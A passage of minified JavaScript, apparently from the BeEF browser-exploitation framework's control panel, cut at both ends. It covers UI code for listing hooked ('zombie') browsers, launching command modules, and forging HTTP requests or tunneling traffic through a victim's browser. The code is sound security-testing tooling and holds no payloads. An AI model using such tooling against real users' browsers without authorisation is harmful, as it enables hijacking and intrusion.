50",v["&ucirc"]="251",v["&uuml"]="252",v["&yacute"]="253",v["&thorn"]="254",v["&yuml"]="255",v["&OElig"]="338",v["&oelig"]="339",v["&Scaron"]="352",v["&scaron"]="353",v["&Yuml"]="376",v["&fnof"]="402",v["&circ"]="710",v["&tilde"]="732",v["&Alpha"]="913",v["&Beta"]="914",v["&Gamma"]="915",v["&Delta"]="916",v["&Epsilon"]="917",v["&Zeta"]="918",v["&Eta"]="919",v["&Theta"]="920",v["&Iota"]="921",v["&Kappa"]="922",v["&Lambda"]="923",v["&Mu"]="924",v["&Nu"]="925",v["&Xi"]="926",v["&Omicron"]="927",v["&Pi"]="928",v["&Rho"]="929",v["&Sigma"]="931",v["&Tau"]="932",v["&Upsilon"]="933",v["&Phi"]="934",v["&Chi"]="935",v["&Psi"]="936",v["&Omega"]="937",v["&alpha"]="945",v["&beta"]="946",v["&gamma"]="947",v["&delta"]="948",v["&epsilon"]="949",v["&zeta"]="950",v["&eta"]="951",v["&theta"]="952",v["&iota"]="953",v["&kappa"]="954",v["&lambda"]="955",v["&mu"]="956",v["&nu"]="957",v["&xi"]="958",v["&omicron"]="959",v["&pi"]="960",v["&rho"]="961",v["&sigmaf"]="962",v["&sigma"]="963",v["&tau"]="964",v["&upsilon"]="965",v["&phi"]="966",v["&chi"]="967",v["&psi"]="968",v["&omega"]="969",v["&thetasym"]="977",v["&upsih"]="978",v["&piv"]="982",v["&ensp"]="8194",v["&emsp"]="8195",v["&thinsp"]="8201",v["&zwnj"]="8204",v["&zwj"]="8205",v["&lrm"]="8206",v["&rlm"]="8207",v["&ndash"]="8211",v["&mdash"]="8212",v["&lsquo"]="8216",v["&rsquo"]="8217",v["&sbquo"]="8218",v["&ldquo"]="8220",v["&rdquo"]="8221",v["&bdquo"]="8222",v["&dagger"]="8224",v["&Dagger"]="8225",v["&bull"]="8226",v["&hellip"]="8230",v["&permil"]="8240",v["&prime"]="8242",v["&Prime"]="8243",v["&lsaquo"]="8249",v["&rsaquo"]="8250",v["&oline"]="8254",v["&frasl"]="8260",v["&euro"]="8364",v["&image"]="8365",v["&weierp"]="8472",v["&real"]="8476",v["&trade"]="8482",v["&alefsym"]="8501",v["&larr"]="8592",v["&uarr"]="8593",v["&rarr"]="8594",v["&darr"]="8595",v["&harr"]="8596",v["&crarr"]="8629",v["&lArr"]="8656",v["&uArr"]="8657",v["&rArr"]="8658",v["&dArr"]="8659",v["&hArr"]="8660",v["&forall"]="8704",v["&part"]="8706",v["&exist"]="8707",v["&empty"]="8709",v["&nabla"]="8711",v["&isin"]="8712",v["&notin"]="8713",v["&ni"]="8715",v["&prod"]="8719",v["&sum"]="8721",v["&minus"]="8722",v["&lowast"]="8727",v["&radic"]="8730",v["&prop"]="8733",v["&infin"]="8734",v["&ang"]="8736",v["&and"]="8743",v["&or"]="8744",v["&cap"]="8745",v["&cup"]="8746",v["&int"]="8747",v["&there4"]="8756",v["&sim"]="8764",v["&cong"]="8773",v["&asymp"]="8776",v["&ne"]="8800",v["&equiv"]="8801",v["&le"]="8804",v["&ge"]="8805",v["&sub"]="8834",v["&sup"]="8835",v["&nsub"]="8836",v["&sube"]="8838",v["&supe"]="8839",v["&oplus"]="8853",v["&otimes"]="8855",v["&perp"]="8869",v["&sdot"]="8901",v["&lceil"]="8968",v["&rceil"]="8969",v["&lfloor"]="8970",v["&rfloor"]="8971",v["&lang"]="9001",v["&rang"]="9002",v["&loz"]="9674",v["&spades"]="9824",v["&clubs"]="9827",v["&hearts"]="9829",v["&diams"]="9830",v)"function"!=typeof v[e]&&v.hasOwnProperty(e)&&(w[v[e]]=e);for(var t in w)if("function"!=typeof w[t]&&w.hasOwnProperty(t)){var n=w[t].toLowerCase().substr(1);_.put(n,String.fromCharCode(t))}}(),Object.freeze?(e.encoder=Object.freeze(e.encoder),e.fn.encode=Object.freeze(e.fn.encode)):Object.seal?(e.encoder=Object.seal(e.encoder),e.fn.encode=Object.seal(e.fn.encode)):Object.preventExtensions&&(e.encoder=Object.preventExtensions(e.encoder),e.fn.encode=Object.preventExtensions(e.fn.encode))}(jQuery);var $jEncoder=jQuery.noConflict();if("undefined"==typeof beefwui&&"undefined"==typeof window.beefwui){var BeefWUI={rest_token:"",hooked_browsers:{},get_rest_token:function(){if(0==this.rest_token.length){var e="/ui/modules/getRestfulApiToken.json";jQuery.ajax({contentType:"application/json",dataType:"json",type:"GET",url:e,async:!1,processData:!1,success:function(e){beefwui.rest_token=e.token},error:function(){beefwui.rest_token=""}})}return this.rest_token},get_hb_id:function(e){var t="";return jQuery.ajax({type:"GET",url:"/api/hooks/?token="+this.get_rest_token(),async:!1,processData:!1,success:function(n){for(var o in n["hooked-browsers"].online)n["hooked-browsers"].online[o].session===e&&(t=n["hooked-browsers"].online[o].id);if(""===t)for(var o in n["hooked-browsers"].offline)n["hooked-browsers"].offline[o].session===e&&(t=n["hooked-browsers"].offline[o].id)},error:function(){commands_statusbar.update_fail("Error getting hb id")}}),t},get_info_from_id:function(e){var t={};return jQuery.ajax({type:"GET",url:"/api/hooks/?token="+this.get_rest_token(),async:!1,processData:!1,success:function(n){for(var o in n["hooked-browsers"].online)n["hooked-browsers"].online[o].id===e&&(t=n["hooked-browsers"].online[o]);if(jQuery.isEmptyObject(t))for(var o in n["hooked-browsers"].offline)n["hooked-browsers"].offline[o].id===e&&(t=n["hooked-browsers"].offline[o])},error:function(){commands_statusbar.update_fail("Error getting hb ip")}}),console.log(t),t}};window.beefwui=BeefWUI}Ext.ns("Ext.ux.data"),Ext.ux.data.PagingStore=Ext.extend(Ext.data.Store,{add:function(e){if(!((e=[].concat(e)).length<1)){for(var t=0,n=e.length;t<n;t++)e[t].join(this);var o=this.data.length;this.data.addAll(e),this.allData&&this.allData.addAll(e),this.snapshot&&this.snapshot.addAll(e),this.totalLength+=e.length,this.fireEvent("add",this,e,o)}},remove:function(e){if(Ext.isArray(e))Ext.each(e,function(e){this.remove(e)},this);else if(this==e.store){e.join(null);var t=this.data.indexOf(e);t>-1&&this.data.removeAt(t),this.pruneModifiedRecords&&this.modified.remove(e),this.allData&&this.allData.remove(e),this.snapshot&&this.snapshot.remove(e),this.totalLength--,t>-1&&this.fireEvent("remove",this,e,t)}},removeAll:function(e){var t=[].concat((this.snapshot||this.allData||this.data).items);this.clearData(),this.pruneModifiedRecords&&(this.modified=[]),this.totalLength=0,!0!==e&&this.fireEvent("clear",this,t)},insert:function(e,t){for(var n=0,o=(t=[].concat(t)).length;n<o;n++)this.data.insert(e,t[n]),t[n].join(this);this.allData&&this.allData.addAll(t),this.snapshot&&this.snapshot.addAll(t),this.totalLength+=t.length,this.fireEvent("add",this,t,e)},getById:function(e){return(this.snapshot||this.allData||this.data).key(e)},clearData:function(){this.allData&&(this.data=this.allData,delete this.allData),this.snapshot&&(this.data=this.snapshot,delete this.snapshot),this.data.each(function(e){e.join(null)}),this.data.clear()},execute:function(e,t,n,o){if(!Ext.data.Api.isAction(e))throw new Ext.data.Api.Error("execute",e);n=Ext.applyIf(n||{},{params:{}}),o!==undefined&&this.addToBatch(o);var r=!0;if("read"===e?(r=this.fireEvent("beforeload",this,n),Ext.applyIf(n.params,this.baseParams)):(!0===this.writer.listful&&!0!==this.restful?t=Ext.isArray(t)?t:[t]:Ext.isArray(t)&&1==t.length&&(t=t.shift()),!1!==(r=this.fireEvent("beforewrite",this,e,t,n))&&this.writer.apply(n.params,this.baseParams,e,t)),!1!==r){if(this.writer&&this.proxy.url&&!this.proxy.restful&&!Ext.data.Api.hasUniqueUrl(this.proxy,e)&&(n.params.xaction=e),"read"===e&&this.isPaging(Ext.apply({},n.params)))return function(){this.allData&&(this.data=this.allData,delete this.allData),this.applyPaging(),this.fireEvent("datachanged",this);var e=[].concat(this.data.items);this.fireEvent("load",this,e,n),n.callback&&n.callback.call(n.scope||this,e,n,!0)}.defer(1,this),!0;this.proxy.request(Ext.data.Api.actions[e],t,n.params,this.reader,this.createCallback(e,t,o),this,n)}return r},loadRecords:function(e,t,n){if(!0!==this.isDestroyed){if(!e||!1===n)return!1!==n&&this.fireEvent("load",this,[],t),void(t.callback&&t.callback.call(t.scope||this,[],t,!1,e));var o=e.records,r=e.totalRecords||o.length;if(t&&!0===t.add)this.totalLength=Math.max(r,this.data.length+o.length),this.add(o);else{this.pruneModifiedRecords&&(this.modified=[]);for(var i=0,a=o.length;i<a;i++)o[i].join(this);this.clearData(),this.data.addAll(o),this.totalLength=r,this.applySort(),this.allData||this.applyPaging(),o.length>this.getCount()&&(o=[].concat(this.data.items)),this.fireEvent("datachanged",this)}this.fireEvent("load",this,o,t),t.callback&&t.callback.call(t.scope||this,o,t,!0)}},loadData:function(e,t){this.isPaging(Ext.apply({},this.lastOptions?this.lastOptions.params:null,this.baseParams));var n=this.reader.readRecords(e);this.loadRecords(n,{add:t},!0)},getTotalCount:function(){return this.allData?this.allData.getCount():this.totalLength||0},sortData:function(){var e=this.hasMultiSort?this.multiSortInfo:this.sortInfo,t=e.direction||"ASC",n=e.sorters,o=[];this.hasMultiSort||(n=[{direction:t,field:e.field}]);for(var r=0,i=n.length;r<i;r++)o.push(this.createSortFunction(n[r].field,n[r].direction));if(o.length){var a="DESC"==t.toUpperCase()?-1:1,s=function(e,t){var n=o[0].call(this,e,t);if(o.length>1)for(var r=1,i=o.length;r<i;r++)n=n||o[r].call(this,e,t);return a*n};this.allData&&(this.data=this.allData,delete this.allData),this.data.sort(t,s),this.snapshot&&this.snapshot!=this.data&&this.snapshot.sort(t,s),this.applyPaging()}},filterBy:function(e,t){this.snapshot=this.snapshot||this.allData||this.data,this.data=this.queryBy(e,t||this),this.applyPaging(),this.fireEvent("datachanged",this)},clearFilter:function(e){this.isFiltered()&&(this.data=this.snapshot,delete this.snapshot,delete this.allData,this.applyPaging(),!0!==e&&this.fireEvent("datachanged",this))},isFiltered:function(){return!!this.snapshot&&this.snapshot!=(this.allData||this.data)},queryBy:function(e,t){return(this.snapshot||this.allData||this.data).filterBy(e,t||this)},collect:function(e,t,n){for(var o,r,i=(!0===n&&(this.snapshot||this.allData)||this.data).items,a=[],s={},l=0,d=i.length;l<d;l++)o=i[l].data[e],r=String(o),!t&&Ext.isEmpty(o)||s[r]||(s[r]=!0,a[a.length]=o);return a},findInsertIndex:function(e){this.suspendEvents();var t=this.data.clone();this.data.add(e),this.applySort();var n=this.data.indexOf(e);return this.data=t,this.totalLength--,this.resumeEvents(),n},isPaging:function(e){var t=this.paramNames,n=e[t.start],o=e[t.limit];if("number"!=typeof n||"number"!=typeof o)return delete this.start,delete this.limit,this.lastParams=e,!1;this.start=n,this.limit=o,delete e[t.start],delete e[t.limit];var r=this.lastParams;if(this.lastParams=e,!this.proxy)return!0;if(!r)return!1;for(var i in e)if(e.hasOwnProperty(i)&&e[i]!==r[i])return!1;for(i in r)if(r.hasOwnProperty(i)&&e[i]!==r[i])return!1;return!0},applyPaging:function(){var e=this.start,t=this.limit;if("number"==typeof e&&"number"==typeof t){var n=this.data,o=new Ext.util.MixedCollection(n.allowFunctions,n.getKey);o.items=n.items.slice(e,e+t),o.keys=n.keys.slice(e,e+t);for(var r=o.length=o.items.length,i={},a=0;a<r;a++){var s=o.items[a];i[o.getKey(s)]=s}o.map=i,this.allData=n,this.data=o}}}),Ext.ux.data.PagingDirectStore=Ext.extend(Ext.ux.data.PagingStore,{constructor:Ext.data.DirectStore.prototype.constructor}),Ext.reg("pagingdirectstore",Ext.ux.data.PagingDirectStore),Ext.ux.data.PagingJsonStore=Ext.extend(Ext.ux.data.PagingStore,{constructor:Ext.data.JsonStore.prototype.constructor}),Ext.reg("pagingjsonstore",Ext.ux.data.PagingJsonStore),Ext.ux.data.PagingXmlStore=Ext.extend(Ext.ux.data.PagingStore,{constructor:Ext.data.XmlStore.prototype.constructor}),Ext.reg("pagingxmlstore",Ext.ux.data.PagingXmlStore),Ext.ux.data.PagingArrayStore=Ext.extend(Ext.ux.data.PagingStore,{constructor:Ext.data.ArrayStore.prototype.constructor,loadData:function(e,t){if(!0===this.expandData){for(var n=[],o=0,r=e.length;o<r;o++)n[n.length]=[e[o]];e=n}Ext.ux.data.PagingArrayStore.superclass.loadData.call(this,e,t)}}),Ext.reg("pagingarraystore",Ext.ux.data.PagingArrayStore),Ext.ux.data.PagingSimpleStore=Ext.ux.data.PagingArrayStore,Ext.reg("pagingsimplestore",Ext.ux.data.PagingSimpleStore),Ext.ux.data.PagingGroupingStore=Ext.extend(Ext.ux.data.PagingStore,Ext.copyTo({},Ext.data.GroupingStore.prototype,["constructor","remoteGroup","groupOnSort","groupDir","clearGrouping","groupBy","sort","applyGroupField","applyGrouping","getGroupState"])),Ext.reg("paginggroupingstore",Ext.ux.data.PagingGroupingStore),Ext.ux.PagingToolbar=Ext.extend(Ext.PagingToolbar,{onLoad:function(e,t,n){if(this.rendered){var o=this.getParams();this.cursor=n.params&&n.params[o.start]?n.params[o.start]:0,this.onChange()}else this.dsLoaded=[e,t,n]},onChange:function(){var e=this.store.getTotalCount(),t=this.pageSize;this.cursor>=e&&(this.cursor=Math.ceil((e+1)/t)*t);var n=this.getPageData(),o=n.activePage,r=n.pages;this.afterTextItem.setText(String.format(this.afterPageText,n.pages)),this.inputItem.setValue(o),this.first.setDisabled(1==o),this.prev.setDisabled(1==o),this.next.setDisabled(o==r),this.last.setDisabled(o==r),this.refresh.enable(),this.updateInfo(),this.fireEvent("change",this,n)},onClear:function(){this.cursor=0,this.onChange()},doRefresh:function(){delete this.store.lastParams,this.doLoad(this.cursor)},bindStore:function(e,t){var n;!t&&this.store&&(e!==this.store&&this.store.autoDestroy?this.store.destroy():(this.store.un("beforeload",this.beforeLoad,this),this.store.un("load",this.onLoad,this),this.store.un("exception",this.onLoadError,this),this.store.un("datachanged",this.onChange,this),this.store.un("add",this.onChange,this),this.store.un("remove",this.onChange,this),this.store.un("clear",this.onClear,this)),e||(this.store=null)),e&&((e=Ext.StoreMgr.lookup(e)).on({scope:this,beforeload:this.beforeLoad,load:this.onLoad,exception:this.onLoadError,datachanged:this.onChange,add:this.onChange,remove:this.onChange,clear:this.onClear}),n=!0),this.store=e,n&&this.onLoad(e,null,{})}}),Ext.reg("ux.paging",Ext.ux.PagingToolbar),Ext.ux.StatusBar=Ext.extend(Ext.Toolbar,{cls:"x-statusbar",busyIconCls:"x-status-busy",errorIconCls:"x-status-error",validIconCls:"x-status-valid",busyText:"Loading...",autoClear:5e3,emptyText:"&nbsp;",activeThreadId:0,initComponent:function(){"right"==this.statusAlign&&(this.cls+=" x-status-right"),Ext.ux.StatusBar.superclass.initComponent.call(this)},afterRender:function(){Ext.ux.StatusBar.superclass.afterRender.call(this);var e="right"==this.statusAlign;this.currIconCls=this.iconCls||this.defaultIconCls,this.statusEl=new Ext.Toolbar.TextItem({cls:"x-status-text "+(this.currIconCls||""),text:this.text||this.defaultText||""}),e?(this.add("->"),this.add(this.statusEl)):(this.insert(0,this.statusEl),this.insert(1,"->")),this.doLayout()},setStatus:function(e){if("string"==typeof(e=e||{})&&(e={text:e}),e.text!==undefined&&this.setText(e.text),e.iconCls!==undefined&&this.setIcon(e.iconCls),e.clear){var t=e.clear,n=this.autoClear,o={useDefaults:!0,anim:!0};"object"==typeof t?(t=Ext.applyIf(t,o)).wait&&(n=t.wait):"number"==typeof t?(n=t,t=o):"boolean"==typeof t&&(t=o),t.threadId=this.activeThreadId,this.clearStatus.defer(n,this,[t])}return this},clearStatus:function(e){if((e=e||{}).threadId&&e.threadId!==this.activeThreadId)return this;var t=e.useDefaults?this.defaultText:this.emptyText,n=e.useDefaults&&this.defaultIconCls?this.defaultIconCls:"";return e.anim?this.statusEl.el.fadeOut({remove:!1,useDisplay:!0,scope:this,callback:function(){this.setStatus({text:t,iconCls:n}),this.statusEl.el.show()}}):(this.statusEl.hide(),this.setStatus({text:t,iconCls:n}),this.statusEl.show()),this},setText:function(e){return this.activeThreadId++,this.text=e||"",this.rendered&&this.statusEl.setText(this.text),this},getText:function(){return this.text},setIcon:function(e){return this.activeThreadId++,e=e||"",this.rendered?(this.currIconCls&&(this.statusEl.removeClass(this.currIconCls),this.currIconCls=null),e.length>0&&(this.statusEl.addClass(e),this.currIconCls=e)):this.currIconCls=e,this},showBusy:function(e){return"string"==typeof e&&(e={text:e}),e=Ext.applyIf(e||{},{text:this.busyText,iconCls:this.busyIconCls}),this.setStatus(e)},showError:function(e){return"string"==typeof e&&(e={text:e}),e=Ext.applyIf(e||{},{text:this.busyText,iconCls:this.errorIconCls}),this.setStatus(e)},showValid:function(e){return"string"==typeof e&&(e={text:e}),e=Ext.applyIf(e||{},{text:this.busyText,iconCls:this.validIconCls}),this.setStatus(e)}}),Ext.reg("statusbar",Ext.ux.StatusBar),Ext.ux.TabCloseMenu=function(){function e(e,r,i){n||(n=new Ext.menu.Menu({items:[{id:t.id+"-close",text:"Close Tab",handler:function(){t.remove(o)}},{id:t.id+"-close-others",text:"Close Other Tabs",handler:function(){t.items.each(function(e){e.closable&&e!=o&&t.remove(e)})}}]})),o=r;var a=n.items;a.get(t.id+"-close").setDisabled(!r.closable);var s=!0;t.items.each(function(){if(this!=r&&this.closable)return s=!1,!1}),a.get(t.id+"-close-others").setDisabled(s),i.stopEvent(),n.showAt(i.getPoint())}var t,n,o;this.init=function(n){(t=n).on("contextmenu",e)}},Ext.preg("tabclosemenu",Ext.ux.TabCloseMenu);var zombie_execute_button_text="Execute",zombie_reexecute_button_text="Re-execute",re_execute_command_title="Re-execute command",mainPanel,zombiesTreeLists,zombieTabs,zombiesManager;Beef_StatusBar=function(e){var t=2e3,n=1e3;Beef_StatusBar.superclass.constructor.call(this,{id:"commands-bbar-zombie-"+e,defaultText:"Ready",defaultIconCls:"x-status-valid",text:"Ready",iconCls:"x-status-valid",update_ready:function(e){var t=e||"Ready";this.setStatus({text:t,iconCls:"x-status-valid"})},update_fail:function(e){var n=e||"Error!";this.setStatus({text:n,iconCls:"x-status-error",clear:{wait:t,anim:!0,useDefaults:!0}})},update_sending:function(e){var t=e||"Sending...";this.showBusy(t)},update_sent:function(e){var t=e||"Sent";this.setStatus({text:t,iconCls:"x-status-valid",clear:{wait:n,anim:!0,useDefaults:!0}})}})},Ext.extend(Beef_StatusBar,Ext.ux.StatusBar,{}),ZombieTab_DetailsTab=function(e){var t=new BrowserDetailsDataGrid("/api/browserdetails/"+e.session,30);t.border=!1,ZombieTab_DetailsTab.superclass.constructor.call(this,{id:"browser-details-tab"+e.session,layout:"fit",title:"Details",items:{layout:"border",border:!1,items:[t]}})},Ext.extend(ZombieTab_DetailsTab,Ext.Panel,{}),ZombieTab_LogTab=function(e){var t=new LogsDataGrid("/api/logs/"+e.session,30);t.border=!1,ZombieTab_LogTab.superclass.constructor.call(this,{id:"zombie-log-tab"+e.session,layout:"fit",title:"Logs",items:{layout:"border",border:!1,items:[t]}})},Ext.extend(ZombieTab_LogTab,Ext.Panel,{}),ZombieTab_Commands=function(e){var t,n=new Ext.Panel({id:"zombie-command-module-config-"+e.session,region:"center",border:!0,layout:"fit"}),o=new Ext.grid.GridPanel({store:new Ext.data.JsonStore({url:"/ui/modules/commandmodule/commands.json",params:{nonce:Ext.get("nonce").dom.value},autoDestroy:!1,autoLoad:!1,root:"commands",fields:["label","creationdate","id","object_id"],sortInfo:{field:"id",direction:"ASC"}}),id:"command-module-grid-zombie-"+e.session,title:"Module Results History",sortable:!0,autoWidth:!1,region:"west",stripeRows:!0,autoScroll:!0,border:!0,width:260,i:0,minSize:160,maxSize:300,split:!0,view:new Ext.grid.GridView({forceFit:!0,emptyText:"The results from executed command modules will be listed here.",enableRowBody:!0}),columns:[{header:"id",width:35,sortable:!0,dataIndex:"id"},{header:"date",width:100,sortable:!0,dataIndex:"creationdate"},{header:"label",sortable:!0,dataIndex:"label",renderer:function(e,t,n){return"command "+$jEncoder.encoder.encodeForHTML(n.get("id")+1)}},{header:"object_id",sortable:!0,dataIndex:"object_id",hidden:!0,menuDisabled:!0}]});o.on("rowclick",function(t,o){var r=t.getStore().getAt(o).data.object_id||null;r&&genExistingExploitPanel(n,r,e,l)}),LoadCommandPanelEvent=function(t,r){if(t.leaf||r){if(!t.leaf&&r)return;n.configLoadMask=new Ext.LoadMask(Ext.getBody(),{msg:"Please wait, module config is loading..."}),n.configLoadMask.show(),o.i=0,o.store.baseParams={command_module_id:t.attributes.id,zombie_session:e.session},o.store.reload({params:{nonce:Ext.get("nonce").dom.value}}),genNewExploitPanel(n,t.id,t.text,e,l),l.showValid("Ready")}else t.toggle()};var r=new Ext.form.TextField({emptyText:"Search",id:"module-search-"+e.session,style:{width:"100%"},listeners:{specialkey:function(e,n){if(n.getKey()==n.ENTER)if(e.getValue()){var o={text:"Search results",children:search_module(t,e.getValue())};a.setRootNode(o)}else a.setRootNode(t)}}}),i=new Ext.Panel({id:"zombie-command-modules-search-panel"+e.session,items:[r],width:190,minSize:190,maxSize:500,region:"north"}),a=new Ext.tree.TreePanel({id:"zombie-command-modules"+e.session,region:"center",width:190,minSize:190,maxSize:500,useArrows:!0,autoScroll:!0,animate:!0,containerScroll:!0,rootVisible:!1,root:{nodeType:"async"},loader:new Ext.tree.TreeLoader({dataUrl:"/ui/modules/select/commandmodules/tree.json",baseParams:{zombie_session:e.session},listeners:{beforeload:function(e){return e.treeLoadingMask=new Ext.LoadMask(Ext.getBody(),{msg:"Please wait, command tree is loading..."}),e.treeLoadingMask.show(),!0},load:function(e){return e.treeLoadingMask.hide(),t=a.root.childNodes,!0}}}),listeners:{click:function(e){LoadCommandPanelEvent(e,!1)},afterrender:function(){},selectionchange:function(){},activate:function(){},deactivate:function(){},select:function(){},keyup:function(){},render:function(t){t.getEl().on("keyup",function(){LoadCommandPanelEvent(Ext.getCmp("zombie-command-modules"+e.session).getSelectionModel().getSelectedNode(),!0)})}}}),s=new Ext.Panel({id:"zombie-command-modules-container"+e.session,title:"Module Tree",border:!0,width:190,minSize:190,maxSize:500,layout:"border",region:"west",split:!0,items:[i,a]}),l=new Beef_StatusBar(e.session);ZombieTab_Commands.superclass.constructor.call(this,{id:"zombie-"+e.session+"-command-module-panel",title:"Commands",layout:"fit",region:"center",items:{layout:"border",border:!1,defaults:{collapsible:!1,split:!0},items:[s,new Ext.Panel({id:"zombie-command-module-west-"+e.session,region:"center",layout:"border",border:!1,items:[o,n]})]},bbar:l});Ext.getCmp("command-module-bbar-zombie-"+e.session)},Ext.extend(ZombieTab_Commands,Ext.Panel,{listeners:{close:function(){}}}),ZombieTab_Requester=function(e){function t(e,t,n){var o=new Ext.FormPanel({title:"Forge Raw HTTP Request",id:"requester-request-form-zombie"+e.session,url:"/api/requester/send/"+e.session+"?token="+beefwui.get_rest_token(),hideLabels:!0,border:!1,padding:"3px 5px 0 5px",items:[{xtype:"checkboxgroup",items:[{boxLabel:"SSL",name:"ssl",inputValue:"1",checked:!1,id:"requester-forge-requests-ssl"}]},{xtype:"textarea",id:"raw-request-zombie-"+e.session,name:"raw_request",width:"100%",height:"100%",allowBlank:!1}],buttons:[{text:"Send",handler:function(){if(Ext.getCmp("requester-forge-requests-ssl").getValue())var n="https";else n="http";var o=Ext.getCmp("requester-request-form-zombie"+e.session).getForm();t.update_sending("Sending request to "+e.ip+"..."),o.submit({params:{raw_request:Ext.getCmp("raw-request-zombie-"+e.session).getValue(),proto:n},success:function(){t.update_sent("Request sent to hooked browser "+e.ip)},failure:function(){t.update_fail("Error! Invalid http request.")}})}}]});n||(e.domain?(n="GET /demos/secret_page.html HTTP/1.1\n",n+="Host: "+e.domain+":"+e.port+"\n"):n="GET / HTTP/1.1\nHost: \n"),o.get("raw-request-zombie-"+e.session).value=n,panel=Ext.getCmp("requester-forge-requests-zombie-"+e.session),panel.setTitle("Forge Request"),panel.add(o)}function n(e,t,n){Ext.Ajax.request({url:"/api/requester/response/"+e.id+"?token="+beefwui.get_rest_token(),method:"DELETE",loadMask:!0,success:function(e){"true"==Ext.decode(e.responseText).success?n.update_sent("Deleted response."):n.update_fail("Error! Could not delete the response.")},failure:function(){n.update_fail("Error! Could not delete the response.")}})}function o(e,t,n){var o=Ext.getCmp("zombie-requester-tab-zombie-"+t.session);n.update_sending("Getting response..."),Ext.Ajax.request({url:"/api/requester/response/"+e.id+"?token="+beefwui.get_rest_token(),loadMask:!0,success:function(t){var r=Ext.decode(t.responseText);if("true"===r.success){var i=new Ext.Panel({title:"Response Headers",border:!1,collapsed:!0,layout:"fit",padding:"5px 5px 5px 5px",items:[new Ext.form.TextArea({id:"requester-response-res-headers-"+e.id,value:r.result.response_headers+"\n"})]}),a=new Ext.Panel({title:"Response Body",border:!1,collapsed:!1,layout:"fit",padding:"5px 5px 5px 5px",items:[new Ext.form.TextArea({id:"requester-response-res-body-"+e.id,value:r.result.response+"\n"})]}),s=new Ext.Panel({title:"Request",border:!1,collapsed:!0,layout:"fit",padding:"5px 5px 5px 5px",items:[new Ext.form.TextArea({id:"requester-response-req-"+e.id,value:r.result.request})]}),l=new Ext.Panel({id:"requester-response-"+e.id,title:$jEncoder.encoder.encodeForHTML(e.path),split:!0,border:!1,layout:"accordion",closable:!0,items:[s,i,a]});o.add(l),
o.activate(l.id),n.update_sent("Displaying response.")}else n.update_fail("Error! Could not load the response.")},failure:function(){n.update_fail("Error! Could not retrieve the response.")}})}var r=new Beef_StatusBar("requester-bbar-zombie-"+e.session),i=new Ext.Panel({id:"requester-forge-requests-zombie-"+e.session,title:"Forge Request",layout:"fit"}),a=new Ext.Panel({id:"requester-proxy-zombie-"+e.session,title:"Help",layout:"fit",padding:"10 10 10 10",html:"<div style='font:11px tahoma,arial,helvetica,sans-serif;width:500px' ><p style='font:11px tahoma,arial,helvetica,sans-serif'>The Tunneling Proxy allows you to use a hooked browser as a proxy. Simply right-click a browser from the Hooked Browsers tree to the left and select \"Use as Proxy\".</p><p style='margin: 10 0 10 0'><img src='/ui/media/images/help/proxy.png'></p><p>The proxy runs on localhost port 6789 by default. Each request sent through the Proxy is recorded in the History panel in the Proxy tab. Click a history item to view the HTTP response headers and response body.</p><p style='margin: 10 0 10 0'><img src='/ui/media/images/help/history.png'></p><p style='font:11px tahoma,arial,helvetica,sans-serif'>To manually forge an arbitrary HTTP request use the \"Forge Request\" tab from the Proxy tab.</p><p style='margin: 10 0 10 0'><img src='/ui/media/images/help/forge.png'></p><p style='font:11px tahoma,arial,helvetica,sans-serif'>For more information see: <a href=\"https://github.com/beefproject/beef/wiki/Tunneling\">https://github.com/beefproject/beef/wiki/Tunneling</a></p></div>",listeners:{activate:function(){}}}),s=new Ext.ux.data.PagingJsonStore({storeId:"requester-history-store-zombie-"+e.session,proxy:new Ext.data.HttpProxy({method:"GET",url:"/api/requester/requests/"+e.session+"?token="+beefwui.get_rest_token()}),remoteSort:!1,autoDestroy:!0,autoLoad:!1,root:"requests",fields:["proto","domain","port","method","request_date","response_date","id","has_ran","path","response_status_code","response_status_text","response_port_status"],sortInfo:{field:"request_date",direction:"DESC"}}),l=30,d=new Ext.PagingToolbar({pageSize:l,store:s,displayInfo:!0,displayMsg:"Displaying history {0} - {1} of {2}",emptyMsg:"No history to display"}),c=new Ext.grid.GridPanel({id:"requester-history-grid-zombie-"+e.session,store:s,bbar:d,border:!1,loadMask:{msg:"Loading History..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No History",enableRowBody:!0}),columns:[{header:"Id",width:10,sortable:!0,dataIndex:"id",hidden:!0},{header:"Proto",width:30,sortable:!0,dataIndex:"proto",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Domain",sortable:!0,dataIndex:"domain",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Port",width:30,sortable:!0,dataIndex:"port",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Method",width:30,sortable:!0,dataIndex:"method",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Path",sortable:!0,dataIndex:"path",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Res Code",width:35,sortable:!0,dataIndex:"response_status_code",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Res Text",width:50,sortable:!0,dataIndex:"response_status_text",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Port Status",width:40,sortable:!0,dataIndex:"response_port_status",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Processed",width:50,sortable:!0,dataIndex:"has_ran",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Req Date",width:50,sortable:!0,dataIndex:"request_date",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Res Date",width:50,sortable:!0,dataIndex:"response_date",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}}],listeners:{rowclick:function(t,n){var i=Ext.getCmp("zombie-requester-tab-zombie-"+e.session),a=t.getStore().getAt(n).data;"complete"==a.has_ran?i.get("requester-response-"+a.id)||o(a,e,r):r.update_fail("Response for this request has not been received yet.")},afterrender:function(e){e.store.reload({params:{start:0,limit:l,sort:"date",dir:"DESC"}})},rowcontextmenu:function(t,i,a){a.preventDefault(),t.getSelectionModel().selectRow(i),t.rowCtxMenu&&t.rowCtxMenu.destroy();var s=t.selModel.getSelected();t.rowCtxMenu=new Ext.menu.Menu({items:[{text:"View Response",iconCls:"network-host-ctxMenu-web",handler:function(){"complete"==s.get("has_ran")?u.get("requester-response-"+s.get("id"))||o(t.getStore().getAt(i).data,e,r):r.update_fail("Response for this request has not been received yet.")}},{text:"Delete Response",iconCls:"zombie-tree-ctxMenu-delete",handler:function(){var o=s.get("id");"complete"==s.get("has_ran")?confirm("Are you sure you want to remove response [id: "+o+"] ?")?(r.update_sending("Removing network host [id: 